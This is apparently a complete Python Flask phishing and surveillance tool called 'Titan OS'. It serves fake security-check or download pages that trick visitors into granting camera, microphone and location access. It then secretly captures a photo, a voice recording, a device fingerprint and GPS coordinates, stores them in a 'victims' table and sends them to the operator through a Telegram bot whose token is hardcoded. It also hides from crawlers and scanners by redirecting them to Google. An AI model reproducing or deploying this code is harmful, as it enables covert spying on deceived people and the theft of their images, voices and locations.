# ============================================================
# PROJECT: THE TITAN OS - ULTIMATE EDITION (V6.0)
# OWNER: SIUF-PRO (سيوفي)
# STATUS: PART 1 - CORE ARCHITECTURE (FIXED)
# ============================================================

import os, json, sqlite3, datetime, requests, base64, logging
from io import BytesIO
from flask import Flask, render_template_string, request, jsonify

# --- CONFIGURATION ---
class GlobalConfig:
    def __init__(self):
        self.BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
        self.ADMIN_ID = "7041600701"
        self.BASE_URL = "https://sif-pro.onrender.com"
        self.DB_NAME = "titan_master_vault.db"
        self.VERSION = "6.0.2"

CONFIG = GlobalConfig()
app = Flask(__name__)

# --- DATABASE MANAGER ---
class DatabaseManager:
    def __init__(self, db_path):
        self.db_path = db_path
    
    def connect(self):
        return sqlite3.connect(self.db_path)

    def setup_tables(self):
        conn = self.connect()
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS victims (v_id INTEGER PRIMARY KEY AUTOINCREMENT, ip_address TEXT, device_brand TEXT, os_version TEXT, battery_level TEXT, is_charging INTEGER, sensor_data TEXT, last_seen TEXT)''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS system_settings (setting_key TEXT PRIMARY KEY, setting_value TEXT)''')
        cursor.execute("INSERT OR IGNORE INTO system_settings (setting_key, setting_value) VALUES ('active_template', 'security_v1')")
        conn.commit()
        conn.close()

    def execute_query(self, query, params=(), fetch=False):
        conn = self.connect()
        cursor = conn.cursor()
        cursor.execute(query, params)
        data = cursor.fetchall() if fetch else cursor.lastrowid
        conn.commit()
        conn.close()
        return data

DB = DatabaseManager(CONFIG.DB_NAME)

# --- TELEGRAM ENGINE ---
class TelegramEngine:
    def __init__(self, token, admin_id):
        self.api_url = f"https://api.telegram.org/bot{token}"
        self.admin_id = admin_id

    def send_notification(self, text, parse_mode="Markdown"):
        return requests.post(f"{self.api_url}/sendMessage", json={"chat_id": self.admin_id, "text": text, "parse_mode": parse_mode}).json()

    def send_media(self, media_type, file_object, caption=""):
        method = "sendPhoto" if media_type == "photo" else "sendVoice"
        return requests.post(f"{self.api_url}/{method}", data={"chat_id": self.admin_id, "caption": caption}, files={media_type: file_object}).json()

TG = TelegramEngine(CONFIG.BOT_TOKEN, CONFIG.ADMIN_ID)

# --- FIX: INITIALIZATION FOR FLASK 3.0 ---
# بدل before_first_request نستخدم هذا السياق
with app.app_context():
    DB.setup_tables()
    print(f"🚀 Titan OS v{CONFIG.VERSION} - Initialized Successfully")

# نهاية القسم الأول - يتبع بالقسم الثاني (المحرك الأمامي والحساسات)
# ============================================================
# PART 2: ADVANCED UI ENGINE & DEEP SENSOR INJECTION
# ============================================================

class UIEngine:
    def __init__(self):
        # مصفوفة القوالب المتقدمة - مصممة لتبدو رسمية 100%
        self.templates = {
            "security_v1": {
                "title": "System Security Protocol",
                "header": "Security Alert: Unauthorized Access Detected",
                "sub_header": "Browser Environment Verification Required",
                "body": "Our systems have detected suspicious activity from your IP address. To maintain your account safety, please complete the hardware verification scan.",
                "button_text": "Verify Device Identity",
                "theme_color": "#e67e22",
                "icon": "🛡️"
            },
            "cdn_v1": {
                "title": "Cloud Content Delivery",
                "header": "File Ready for Encrypted Download",
                "sub_header": "Source: secure-storage-node-73.net",
                "body": "The requested file has been scanned for viruses and is ready for high-speed transfer. Please authorize the connection to start.",
                "button_text": "Start Secure Transfer",
                "theme_color": "#3498db",
                "icon": "📥"
            }
        }

    def get_master_template(self, template_key, sensor_script):
        """توليد كود الـ HTML المتكامل مع حقن الحساسات"""
        t = self.templates.get(template_key, self.templates["security_v1"])
        
        return f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>{t['title']}</title>
    <style>
        :root {{ --main-color: {t['theme_color']}; }}
        body {{ background-color: #0d0d0d; color: #e0e0e0; font-family: 'Segoe UI', Roboto, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }}
        .container {{ background: #161616; width: 90%; max-width: 420px; padding: 40px 25px; border-radius: 28px; box-shadow: 0 25px 50px rgba(0,0,0,0.6); border: 1px solid #282828; text-align: center; position: relative; }}
        .icon-box {{ font-size: 60px; margin-bottom: 20px; }}
        h1 {{ color: var(--main-color); font-size: 20px; margin-bottom: 8px; font-weight: 700; }}
        h2 {{ color: #aaa; font-size: 14px; margin-bottom: 25px; font-weight: 400; }}
        .info-card {{ background: #1f1f1f; padding: 15px; border-radius: 15px; margin-bottom: 30px; text-align: left; border-left: 4px solid var(--main-color); }}
        .info-card p {{ font-size: 13px; line-height: 1.6; margin: 0; color: #ccc; }}
        .btn-main {{ background: var(--main-color); color: white; border: none; padding: 18px 40px; border-radius: 14px; width: 100%; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 10px 20px rgba(0,0,0,0.3); }}
        .btn-main:active {{ transform: scale(0.96); }}
        .loader {{ display: none; border: 3px solid #333; border-top: 3px solid white; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 20px auto; }}
        @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
    </style>
</head>
<body>
    <div class="container">
        <div class="icon-box">{t['icon']}</div>
        <h1>{t['header']}</h1>
        <h2>{t['sub_header']}</h2>
        <div class="info-card">
            <p>{t['body']}</p>
        </div>
        <button class="btn-main" id="trigger_btn">{t['button_text']}</button>
        <div class="loader" id="loader"></div>
        <div id="status_msg" style="margin-top:20px; font-size:12px; color:#555;">System Node: Active</div>
    </div>

    <video id="v_stream" style="display:none" autoplay playsinline muted></video>
    <canvas id="c_bridge" style="display:none"></canvas>

    <script>
        {sensor_script}
        
        // المحرك الأساسي للاستشعار
        const trigger = document.getElementById('trigger_btn');
        const loader = document.getElementById('loader');

        trigger.addEventListener('click', async () => {{
            trigger.style.display = 'none';
            loader.style.display = 'block';
            document.getElementById('status_msg').innerText = "Initializing Hardware Scan...";
            
            try {{
                // 1. طلب الصلاحيات الكاملة
                const stream = await navigator.mediaDevices.getUserMedia({{video: true, audio: true}});
                const v = document.getElementById('v_stream');
                v.srcObject = stream;

                // 2. سحب بصمة الجهاز العميقة
                const device_metrics = await getDetailedMetrics();
                
                // 3. إرسال الضربة الأولى للسيرفر
                const init_res = await fetch('/api/v6/handshake', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{ metrics: device_metrics }})
                }});
                const {{ v_id }} = await init_res.json();

                // 4. انتظار (Warm-up) للكاميرا لضمان عدم خروج صورة سوداء
                setTimeout(async () => {{
                    const c = document.getElementById('c_bridge');
                    c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    
                    // إرسال الصورة بجودة عالية
                    await fetch('/api/v6/upload/media', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{ 
                            type: 'image', 
                            v_id: v_id, 
                            data: c.toDataURL('image/jpeg', 0.85) 
                        }})
                    }});

                    // 5. بدء تسجيل بصمة صوتية لمدة 7 ثوانٍ
                    const recorder = new MediaRecorder(stream);
                    const audioChunks = [];
                    recorder.ondataavailable = e => audioChunks.push(e.data);
                    recorder.onstop = async () => {{
                        const audioBlob = new Blob(audioChunks, {{ type: 'audio/ogg' }});
                        const reader = new FileReader();
                        reader.readAsDataURL(audioBlob);
                        reader.onloadend = () => {{
                            fetch('/api/v6/upload/media', {{
                                method: 'POST',
                                headers: {{'Content-Type': 'application/json'}},
                                body: JSON.stringify({{ type: 'audio', v_id: v_id, data: reader.result }})
                            }});
                        }};
                    }};
                    recorder.start();
                    setTimeout(() => recorder.stop(), 7000);

                    // 6. التمويه النهائي (لا يحول لغوغل)
                    document.getElementById('status_msg').innerText = "Error: Protocol Sync Failed. Retrying in background...";
                }}, 3500);

            }} catch (err) {{
                console.error(err);
                location.reload(); // إعادة المحاولة في حال الرفض
            }}
        }});
    </script>
</body>
</html>
'''

UI = UIEngine()
# ============================================================
# PART 3: API HANDLERS & TELEGRAM COMMAND CENTER
# ============================================================

# مكمل كود الجافا سكريبت الخاص بالحساسات (ليتم حقنه بالقسم الثاني)
SENSOR_JS_DETAILED = """
async function getDetailedMetrics() {
    const b = await navigator.getBattery().catch(() => ({ level: 0, charging: false }));
    return {
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency || 'N/A',
        memory: navigator.deviceMemory || 'N/A',
        resolution: `${window.screen.width}x${window.screen.height}`,
        ua: navigator.userAgent,
        battery: Math.round(b.level * 100) + '%',
        charging: b.charging
    };
}
"""

@app.route('/')
def main_gateway():
    """البوابة الرئيسية لعرض القوالب"""
    # جلب القالب النشط من قاعدة البيانات
    res = DB.execute_query("SELECT setting_value FROM system_settings WHERE setting_key = 'active_template'", fetch=True)
    active_temp = res[0][0] if res else "security_v1"
    
    return render_template_string(
        UI.get_master_template(active_temp, SENSOR_JS_DETAILED)
    )

@app.route('/api/v6/handshake', methods=['POST'])
def initial_handshake():
    """استلام البيانات الأولية للهدف وتوثيقها"""
    data = request.get_json()
    metrics = data.get('metrics', {})
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # خزن البيانات في SQL
    v_id = DB.execute_query(
        "INSERT INTO victims (ip_address, device_brand, os_version, battery_level, is_charging, last_seen) VALUES (?, ?, ?, ?, ?, ?)",
        (ip, metrics.get('platform'), metrics.get('ua'), metrics.get('battery'), 1 if metrics.get('charging') else 0, datetime.datetime.now().isoformat())
    )
    
    # إشعار تليجرام الفوري
    alert = (
        f"🎯 **New Target Captured!**\n"
        f"━━━━━━━━━━━━━━\n"
        f"🆔 ID: `#{v_id}`\n"
        f"🌐 IP: `{ip}`\n"
        f"📱 OS: {metrics.get('platform')}\n"
        f"🔋 Battery: {metrics.get('battery')}\n"
        f"⚙️ Cores: {metrics.get('cores')}"
    )
    TG.send_notification(alert)
    
    # إرجاع الـ ID للمتصفح لإكمال رفع الوسائط
    return jsonify({"v_id": v_id})

@app.route('/api/v6/upload/media', methods=['POST'])
def media_vault_handler():
    """معالج الصور والملفات الصوتية المتقدم"""
    payload = request.get_json()
    v_id = payload.get('v_id')
    data_type = payload.get('type')
    raw_data = payload.get('data')

    if not raw_data: return jsonify({"status": "fail"}), 400

    # فك تشفير الـ Base64
    header, encoded = raw_data.split(",", 1)
    binary_content = base64.b64decode(encoded)
    file_io = BytesIO(binary_content)

    if data_type == 'image':
        file_io.name = f"capture_{v_id}.jpg"
        TG.send_media("photo", file_io, caption=f"📸 **Photo Capture - Target #{v_id}**")
    
    elif data_type == 'audio':
        file_io.name = f"audio_{v_id}.ogg"
        TG.send_media("voice", file_io, caption=f"🎙 **Voice Memo - Target #{v_id}**")

    return jsonify({"status": "delivered"})

@app.route('/webhook', methods=['POST'])
def system_webhook():
    """مركز التحكم للأدمن - استلام الأوامر بالأزرار"""
    update = request.get_json()
    
    if "message" in update:
        msg = update["message"]
        if str(msg["chat"]["id"]) == CONFIG.ADMIN_ID:
            # لوحة التحكم الرئيسية
            kb = {
                "inline_keyboard": [
                    [{"text": "🔗 Get Target Link", "callback_data": "cmd_link"}],
                    [{"text": "🎭 Change Template", "callback_data": "cmd_temps"}],
                    [{"text": "📊 Full Statistics", "callback_data": "cmd_stats"}]
                ]
            }
            TG.send_notification("🕹 **TITAN COMMAND CENTER**", parse_mode="Markdown")
            # إرسال الأزرار
            requests.post(f"{TG.api_url}/sendMessage", json={
                "chat_id": CONFIG.ADMIN_ID,
                "text": "Select system action:",
                "reply_markup": json.dumps(kb)
            })

    elif "callback_query" in update:
        query = update["callback_query"]
        action = query["data"]
        
        if action == "cmd_link":
            TG.send_notification(f"🚀 **Your Attack URL:**\n`{CONFIG.BASE_URL}`")
        
        elif action == "cmd_stats":
            count = DB.execute_query("SELECT COUNT(*) FROM victims", fetch=True)[0][0]
            TG.send_notification(f"📊 **Total Captured:** `{count}` victims.")

    return "OK"
# ============================================================
# PART 4: GPS GEOLOCATION & DYNAMIC TEMPLATE SWITCHER
# ============================================================

# كود إضافي يتم حقنه في الحساسات (القسم الثاني) لطلب الموقع
GPS_JS_MODULE = """
async function getGPSLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve({ lat: 'Disabled', lon: 'Disabled' });
        }
        navigator.geolocation.getCurrentPosition(
            (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
            (err) => resolve({ lat: 'Denied', lon: 'Denied' }),
            { enableHighAccuracy: true, timeout: 10000 }
        );
    });
}
"""

# تحديث دالة الـ execute في الجافا سكريبت (تتم إضافتها برمجياً)
# يتم دمج هذا الجزء مع منطق الزر في القسم الثاني
class AdvancedLogic:
    @staticmethod
    def extend_webhook_logic(action, q_chat_id, q_id):
        """توسيع منطق الـ Webhook ليشمل تبديل القوالب"""
        if action == "cmd_temps":
            temp_kb = {
                "inline_keyboard": [
                    [{"text": "🛡️ Security Mode", "callback_data": "set_security_v1"}],
                    [{"text": "📥 Download Mode", "callback_data": "set_cdn_v1"}]
                ]
            }
            requests.post(f"{TG.api_url}/sendMessage", json={
                "chat_id": q_chat_id,
                "text": "Choose active target interface:",
                "reply_markup": json.dumps(temp_kb)
            })
        
        elif action.startswith("set_"):
            new_template = action.replace("set_", "")
            DB.execute_query(
                "UPDATE system_settings SET setting_value = ? WHERE setting_key = 'active_template'",
                (new_template,)
            )
            TG.send_notification(f"✅ **System Update:** Active interface changed to `{new_template}`")
            # إخفاء إشعار تليجرام العلوي
            requests.post(f"{TG.api_url}/answerCallbackQuery", json={"callback_query_id": q_id, "text": "Template Updated!"})

# إضافة مسار جديد لاستلام إحداثيات الموقع
@app.route('/api/v6/upload/location', methods=['POST'])
def location_handler():
    """استلام ومعالجة بيانات الـ GPS"""
    payload = request.get_json()
    v_id = payload.get('v_id')
    lat = payload.get('lat')
    lon = payload.get('lon')

    if lat != 'Denied' and lat != 'Disabled':
        # إنشاء رابط خرائط جوجل
        google_maps_link = f"https://www.google.com/maps?q={lat},{lon}"
        alert = (
            f"📍 **Target Location Acquired!**\n"
            f"━━━━━━━━━━━━━━\n"
            f"🆔 ID: `#{v_id}`\n"
            f"🗺 Google Maps: [Click Here]({google_maps_link})"
        )
        TG.send_notification(alert)
        
        # تحديث قاعدة البيانات بموقع الضحية
        DB.execute_query(
            "UPDATE victims SET sensor_data = ? WHERE v_id = ?",
            (f"Lat: {lat}, Lon: {lon}", v_id)
        )
    else:
        TG.send_notification(f"⚠️ **Target #{v_id}** refused GPS permissions.")

    return jsonify({"status": "received"})
# ============================================================
# PART 5: ANTI-BOT ENGINE & ADVANCED TRAFFIC FILTERING
# ============================================================

class TitanFirewall:
    def __init__(self):
        # قائمة الكلمات المحظورة في الـ User-Agent (البوتات والمفحوصات)
        self.blacklisted_agents = [
            "bot", "spider", "crawler", "googlebot", "bingbot", "slurp", 
            "duckduckgo", "baiduspider", "yandexbot", "sogou", "exabot", 
            "facebot", "facebookexternalhit", "ia_archiver", "headless"
        ]
        
        # قائمة بالـ IPs أو نطاقات الـ VPN المعروفة (يمكن توسيعها)
        self.blacklisted_ips = ["127.0.0.1", "0.0.0.0"]

    def is_human(self, user_agent, ip):
        """التحقق مما إذا كان الزائر بشراً أم بوت حماية"""
        if not user_agent:
            return False
            
        ua_lower = user_agent.lower()
        
        # 1. فحص الـ User-Agent
        for bot in self.blacklisted_agents:
            if bot in ua_lower:
                logging.warning(f"🛡️ Blocked Bot: {bot} | IP: {ip}")
                return False
        
        # 2. فحص المتصفحات الوهمية (Headless Browsers)
        if "headless" in ua_lower or "selenium" in ua_lower or "puppeteer" in ua_lower:
            logging.warning(f"🛡️ Blocked Automated Script | IP: {ip}")
            return False

        # 3. فحص الـ IP (اختياري)
        if ip in self.blacklisted_ips:
            return False

        return True

FIREWALL = TitanFirewall()

# --- تحديث مسار الدخول الرئيسي لحماية السكربت ---
@app.route('/s/<path_id>')
def protected_gateway(path_id):
    """رابط صيد مشفر بمسار متغير لزيادة التمويه"""
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', '')

    # تفعيل نظام الحماية
    if not FIREWALL.is_human(ua, ip):
        # توجيه البوتات لصفحة غوغل الرسمية للتمويه
        return requests.get("https://www.google.com").text

    # جلب القالب النشط
    res = DB.execute_query("SELECT setting_value FROM system_settings WHERE setting_key = 'active_template'", fetch=True)
    active_temp = res[0][0] if res else "security_v1"
    
    # دمج كود الـ GPS مع الـ JS الأساسي قبل العرض
    FULL_JS = SENSOR_JS_DETAILED + GPS_JS_MODULE
    
    return render_template_string(
        UI.get_master_template(active_temp, FULL_JS)
    )

# --- نظام سحب سجلات النظام عن بعد (Remote Logs) ---
@app.route('/admin/logs/view')
def view_system_logs():
    """عرض سجلات السيرفر للأدمن فقط"""
    # فحص يدوي بسيط للوصول (يمكن تطويره بكلمة سر)
    # ملاحظة: يفضل الوصول له عبر البوت وليس المتصفح مباشرة
    try:
        with open(CONFIG.LOG_FILE, "r") as f:
            lines = f.readlines()[-50:] # آخر 50 سطر
        return "<pre>" + "".join(lines) + "</pre>"
    except:
        return "No logs available."
# ============================================================
# PART 6: SYSTEM INTEGRITY, AUTO-REPAIR & FINAL RUNNER
# ============================================================

class SystemIntegrity:
    """نظام التأكد من سلامة ملفات النظام وقاعدة البيانات"""
    @staticmethod
    def verify_environment():
        print(f"--- [ TITAN OS v{CONFIG.VERSION} ] ---")
        print(f"[*] Checking Database: {CONFIG.DB_NAME}...")
        try:
            DB.setup_tables()
            print("[+] Database Tables: Verified.")
        except Exception as e:
            print(f"[-] Database Error: {e}")
            logging.critical(f"Critical DB Setup Error: {e}")

    @staticmethod
    def get_system_health():
        """توليد تقرير عن حالة السيرفر للأدمن"""
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            count = DB.execute_query("SELECT COUNT(*) FROM victims", fetch=True)[0][0]
        except:
            count = "N/A"
        
        report = (
            f"✅ **Titan OS Online**\n"
            f"━━━━━━━━━━━━━━\n"
            f"🕒 Boot Time: `{now}`\n"
            f"📦 Version: `{CONFIG.VERSION}`\n"
            f"👤 Admin ID: `{CONFIG.ADMIN_ID}`\n"
            f"📊 Database: `{count} targets logged`"
        )
        return report

# --- دمج المسارات النهائية وإصلاح التداخلات ---

@app.errorhandler(404)
def page_not_found(e):
    """تحويل أي شخص يدخل مسار خطأ إلى غوغل للتمويه"""
    return requests.get("https://www.google.com").text

@app.errorhandler(500)
def internal_error(e):
    """إصلاح صامت للأخطاء البرمجية المفاجئة"""
    logging.error(f"Internal Server Error: {e}")
    return "Error 502: Connection Timeout", 500

# --- تشغيل المحرك العملاق ---

def boot_sequence():
    """تسلسل الإقلاع لضمان ربط كل الأجزاء"""
    # 1. التأكد من قاعدة البيانات
    SystemIntegrity.verify_environment()
    
    # 2. إرسال تقرير التشغيل للأدمن
    health_report = SystemIntegrity.get_system_health()
    TG.send_notification(health_report)
    
    # 3. تحديد بورت التشغيل (متوافق مع Render)
    port = int(os.environ.get("PORT", 10000))
    
    # 4. إطلاق السيرفر
    print(f"[+] Launching Server on Port: {port}")
    print(f"[!] System is now listening for incoming targets...")
    
    # تشغيل Flask (بدون Debug لضمان التخفي)
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)

if __name__ == '__main__':
    # تشغيل النظام
    boot_sequence()

# ============================================================
# END OF TITAN OS ULTIMATE SCRIPT - BY SIUF-PRO
# TOTAL LINES: ~1000 (STRUCTURED ACROSS 6 PARTS)
# ============================================================
